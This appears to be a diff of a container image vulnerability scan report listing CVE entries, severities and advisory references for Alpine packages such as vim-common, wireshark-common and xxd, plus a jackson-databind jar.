 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13727,7 +14165,8 @@
 │                       │       │                   archive. This vulnerability is fixed in 9.2.0678. 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-77 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -13748,7 +14187,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57453 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.52Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T17:16:34.82Z 
-│                       ├ [165] ╭ VulnerabilityID : CVE-2026-57455 
+│                       ├ [176] ╭ VulnerabilityID : CVE-2026-57455 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13786,7 +14225,8 @@
 │                       │       │                   9.2.0698. 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -13807,7 +14247,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57455 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.773Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:23:21.857Z 
-│                       ├ [166] ╭ VulnerabilityID : CVE-2026-57456 
+│                       ├ [177] ╭ VulnerabilityID : CVE-2026-57456 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13843,7 +14283,8 @@
 │                       │       │                   m 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-94 
-│                       │       ├ VendorSeverity   ╭ azure : 3 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 3 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 3 
 │                       │       │                  ╰ ubuntu: 2 
@@ -13864,7 +14305,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57456 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.9Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T05:16:31.51Z 
-│                       ├ [167] ╭ VulnerabilityID : CVE-2026-59856 
+│                       ├ [178] ╭ VulnerabilityID : CVE-2026-59856 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13921,7 +14362,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59856 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.42Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T05:16:19.477Z 
-│                       ├ [168] ╭ VulnerabilityID : CVE-2026-59858 
+│                       ├ [179] ╭ VulnerabilityID : CVE-2026-59858 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -13975,7 +14416,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59858 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.74Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T05:16:19.603Z 
-│                       ├ [169] ╭ VulnerabilityID : CVE-2026-55892 
+│                       ├ [180] ╭ VulnerabilityID : CVE-2026-55892 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -14010,7 +14451,8 @@
 │                       │       │                   in 9.2.0662. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ photon: 2 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -14028,7 +14470,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-55892 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:40.69Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T19:16:44.667Z 
-│                       ├ [170] ╭ VulnerabilityID : CVE-2026-57451 
+│                       ├ [181] ╭ VulnerabilityID : CVE-2026-57451 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -14062,7 +14504,8 @@
 │                       │       │                   crash. This vulnerability is fixed in 9.2.0670. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-125 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 2 
 │                       │       │                  ├ photon: 2 
 │                       │       │                  ╰ redhat: 2 
@@ -14082,7 +14525,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-57451 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.263Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:11:55.71Z 
-│                       ├ [171] ╭ VulnerabilityID : CVE-2026-57452 
+│                       ├ [182] ╭ VulnerabilityID : CVE-2026-57452 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -14131,7 +14574,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57452 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.397Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:12:32.483Z 
-│                       ├ [172] ╭ VulnerabilityID : CVE-2026-57454 
+│                       ├ [183] ╭ VulnerabilityID : CVE-2026-57454 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -14163,7 +14606,8 @@
 │                       │       │                   9.2.0679. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-125 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 2 
 │                       │       │                  ╰ redhat: 2 
 │                       │       ├ CVSS             ─ nvd ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:H 
@@ -14178,7 +14622,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-57454 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.647Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T19:16:45.077Z 
-│                       ├ [173] ╭ VulnerabilityID : CVE-2026-59857 
+│                       ├ [184] ╭ VulnerabilityID : CVE-2026-59857 
 │                       │       ├ PkgID           : vim-common@9.2.0481-r0 
 │                       │       ├ PkgName         : vim-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/vim-common@9.2.0481-r0?arch=x86_64&di
@@ -14234,7 +14678,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59857 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.58Z 
 │                       │       ╰ LastModifiedDate: 2026-07-10T19:23:21.923Z 
-│                       ├ [174] ╭ VulnerabilityID : CVE-2026-15163 
+│                       ├ [185] ╭ VulnerabilityID : CVE-2026-15163 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14284,7 +14728,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.227Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:56:30.983Z 
-│                       ├ [175] ╭ VulnerabilityID : CVE-2026-15169 
+│                       ├ [186] ╭ VulnerabilityID : CVE-2026-15169 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14327,7 +14771,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.777Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T20:02:39.197Z 
-│                       ├ [176] ╭ VulnerabilityID : CVE-2026-15164 
+│                       ├ [187] ╭ VulnerabilityID : CVE-2026-15164 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14370,7 +14814,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.343Z 
 │                       │       ╰ LastModifiedDate: 2026-07-10T13:50:59.683Z 
-│                       ├ [177] ╭ VulnerabilityID : CVE-2026-15165 
+│                       ├ [188] ╭ VulnerabilityID : CVE-2026-15165 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14413,7 +14857,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.45Z 
 │                       │       ╰ LastModifiedDate: 2026-07-10T13:51:09.72Z 
-│                       ├ [178] ╭ VulnerabilityID : CVE-2026-15166 
+│                       ├ [189] ╭ VulnerabilityID : CVE-2026-15166 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14456,7 +14900,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.56Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:59:14.163Z 
-│                       ├ [179] ╭ VulnerabilityID : CVE-2026-15167 
+│                       ├ [190] ╭ VulnerabilityID : CVE-2026-15167 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14499,7 +14943,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.667Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T20:01:49.55Z 
-│                       ├ [180] ╭ VulnerabilityID : CVE-2026-15170 
+│                       ├ [191] ╭ VulnerabilityID : CVE-2026-15170 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14537,7 +14981,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.88Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:26:00.323Z 
-│                       ├ [181] ╭ VulnerabilityID : CVE-2026-15171 
+│                       ├ [192] ╭ VulnerabilityID : CVE-2026-15171 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14575,7 +15019,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:47.99Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:24:29.03Z 
-│                       ├ [182] ╭ VulnerabilityID : CVE-2026-15172 
+│                       ├ [193] ╭ VulnerabilityID : CVE-2026-15172 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14613,7 +15057,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:48.097Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:23:17.337Z 
-│                       ├ [183] ╭ VulnerabilityID : CVE-2026-15173 
+│                       ├ [194] ╭ VulnerabilityID : CVE-2026-15173 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14652,7 +15096,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:48.203Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:22:28.693Z 
-│                       ├ [184] ╭ VulnerabilityID : CVE-2026-15174 
+│                       ├ [195] ╭ VulnerabilityID : CVE-2026-15174 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14691,7 +15135,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T21:16:48.31Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:21:52.893Z 
-│                       ├ [185] ╭ VulnerabilityID : CVE-2026-15168 
+│                       ├ [196] ╭ VulnerabilityID : CVE-2026-15168 
 │                       │       ├ PkgID           : wireshark-common@4.6.5-r0 
 │                       │       ├ PkgName         : wireshark-common 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/wireshark-common@4.6.5-r0?arch=x86_64
@@ -14734,7 +15178,7 @@
 │                       │       │                         tml 
 │                       │       ├ PublishedDate   : 2026-07-08T22:17:13.717Z 
 │                       │       ╰ LastModifiedDate: 2026-07-09T19:20:39.57Z 
-│                       ├ [186] ╭ VulnerabilityID : CVE-2026-52858 
+│                       ├ [197] ╭ VulnerabilityID : CVE-2026-52858 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -14791,7 +15235,7 @@
 │                       │       │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-52858 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.487Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:57:53.5Z 
-│                       ├ [187] ╭ VulnerabilityID : CVE-2026-52859 
+│                       ├ [198] ╭ VulnerabilityID : CVE-2026-52859 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -14854,7 +15298,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-52859 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.627Z 
 │                       │       ╰ LastModifiedDate: 2026-06-17T10:57:53.623Z 
-│                       ├ [188] ╭ VulnerabilityID : CVE-2026-52860 
+│                       ├ [199] ╭ VulnerabilityID : CVE-2026-52860 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -14919,7 +15363,7 @@
 │                       │       │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2026-52860 
 │                       │       ├ PublishedDate   : 2026-06-11T19:16:47.773Z 
 │                       │       ╰ LastModifiedDate: 2026-07-15T01:16:22.423Z 
-│                       ├ [189] ╭ VulnerabilityID : CVE-2026-55895 
+│                       ├ [200] ╭ VulnerabilityID : CVE-2026-55895 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -14956,7 +15400,8 @@
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ╭ [0]: CWE-78 
 │                       │       │                  ╰ [1]: CWE-94 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ photon: 3 
 │                       │       │                  ├ redhat: 3 
@@ -14978,7 +15423,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-55895 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:41.077Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T05:16:31.097Z 
-│                       ├ [190] ╭ VulnerabilityID : CVE-2026-57453 
+│                       ├ [201] ╭ VulnerabilityID : CVE-2026-57453 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15013,7 +15458,8 @@
 │                       │       │                   archive. This vulnerability is fixed in 9.2.0678. 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-77 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -15034,7 +15480,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57453 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.52Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T17:16:34.82Z 
-│                       ├ [191] ╭ VulnerabilityID : CVE-2026-57455 
+│                       ├ [202] ╭ VulnerabilityID : CVE-2026-57455 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15072,7 +15518,8 @@
 │                       │       │                   9.2.0698. 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -15093,7 +15540,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57455 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.773Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:23:21.857Z 
-│                       ├ [192] ╭ VulnerabilityID : CVE-2026-57456 
+│                       ├ [203] ╭ VulnerabilityID : CVE-2026-57456 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15129,7 +15576,8 @@
 │                       │       │                   m 
 │                       │       ├ Severity        : HIGH 
 │                       │       ├ CweIDs           ─ [0]: CWE-94 
-│                       │       ├ VendorSeverity   ╭ azure : 3 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 3 
 │                       │       │                  ├ nvd   : 3 
 │                       │       │                  ├ redhat: 3 
 │                       │       │                  ╰ ubuntu: 2 
@@ -15150,7 +15598,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57456 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.9Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T05:16:31.51Z 
-│                       ├ [193] ╭ VulnerabilityID : CVE-2026-59856 
+│                       ├ [204] ╭ VulnerabilityID : CVE-2026-59856 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15207,7 +15655,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59856 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.42Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T05:16:19.477Z 
-│                       ├ [194] ╭ VulnerabilityID : CVE-2026-59858 
+│                       ├ [205] ╭ VulnerabilityID : CVE-2026-59858 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15261,7 +15709,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-59858 
 │                       │       ├ PublishedDate   : 2026-07-09T23:17:06.74Z 
 │                       │       ╰ LastModifiedDate: 2026-07-14T05:16:19.603Z 
-│                       ├ [195] ╭ VulnerabilityID : CVE-2026-55892 
+│                       ├ [206] ╭ VulnerabilityID : CVE-2026-55892 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15296,7 +15744,8 @@
 │                       │       │                   in 9.2.0662. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-787 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ photon: 2 
 │                       │       │                  ├ redhat: 2 
 │                       │       │                  ╰ ubuntu: 2 
@@ -15314,7 +15763,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-55892 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:40.69Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T19:16:44.667Z 
-│                       ├ [196] ╭ VulnerabilityID : CVE-2026-57451 
+│                       ├ [207] ╭ VulnerabilityID : CVE-2026-57451 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15348,7 +15797,8 @@
 │                       │       │                   crash. This vulnerability is fixed in 9.2.0670. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-125 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 2 
 │                       │       │                  ├ photon: 2 
 │                       │       │                  ╰ redhat: 2 
@@ -15368,7 +15818,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-57451 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.263Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:11:55.71Z 
-│                       ├ [197] ╭ VulnerabilityID : CVE-2026-57452 
+│                       ├ [208] ╭ VulnerabilityID : CVE-2026-57452 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15417,7 +15867,7 @@
 │                       │       │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-57452 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.397Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T04:12:32.483Z 
-│                       ├ [198] ╭ VulnerabilityID : CVE-2026-57454 
+│                       ├ [209] ╭ VulnerabilityID : CVE-2026-57454 
 │                       │       ├ PkgID           : xxd@9.2.0481-r0 
 │                       │       ├ PkgName         : xxd 
 │                       │       ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15449,7 +15899,8 @@
 │                       │       │                   9.2.0679. 
 │                       │       ├ Severity        : MEDIUM 
 │                       │       ├ CweIDs           ─ [0]: CWE-125 
-│                       │       ├ VendorSeverity   ╭ azure : 2 
+│                       │       ├ VendorSeverity   ╭ amazon: 3 
+│                       │       │                  ├ azure : 2 
 │                       │       │                  ├ nvd   : 2 
 │                       │       │                  ╰ redhat: 2 
 │                       │       ├ CVSS             ─ nvd ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:H 
@@ -15464,7 +15915,7 @@
 │                       │       │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-57454 
 │                       │       ├ PublishedDate   : 2026-06-25T16:16:42.647Z 
 │                       │       ╰ LastModifiedDate: 2026-06-26T19:16:45.077Z 
-│                       ╰ [199] ╭ VulnerabilityID : CVE-2026-59857 
+│                       ╰ [210] ╭ VulnerabilityID : CVE-2026-59857 
 │                               ├ PkgID           : xxd@9.2.0481-r0 
 │                               ├ PkgName         : xxd 
 │                               ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/xxd@9.2.0481-r0?arch=x86_64&distro=3.
@@ -15524,447 +15975,1210 @@
       ├ Class          : lang-pkgs 
       ├ Type           : jar 
       ├ Packages        
-      ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : CVE-2026-54512 
-                        │     ├ VendorIDs        ─ [0]: GHSA-j3rv-43j4-c7qm 
-                        │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
-                        │     ├ PkgPath         : openaf/openaf.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
-                        │     │                  │       2.21.1 
-                        │     │                  ╰ UID : 6bd66f14c6cb3d57 
-                        │     ├ InstalledVersion: 2.21.1 
-                        │     ├ FixedVersion    : 2.18.8, 3.1.4, 2.21.4 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e1279
-                        │     │                  │         a8305ba35c82bf9229f 
-                        │     │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f7
-                        │     │                            ea46f72dd8aa890c14b 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54512 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:9f6ce7a8c23db461da5468fa6d3707bc366da7bb4bad4fc7ae1c14
-                        │     │                   82a422f2e2 
-                        │     ├ Title           : jackson-databind: jackson-databind: Arbitrary code execution
-                        │     │                   via PolymorphicTypeValidator bypass 
-                        │     ├ Description     : jackson-databind contains the general-purpose data-binding
-                        │     │                   functionality and tree-model for Jackson Data Processor. From
-                        │     │                    2.10.0 until 2.18.8, 2.21.4, and 3.1.4, jackson-databind's
-                        │     │                   PolymorphicTypeValidator (PTV) is the primary safety
-                        │     │                   mechanism guarding polymorphic deserialization. When
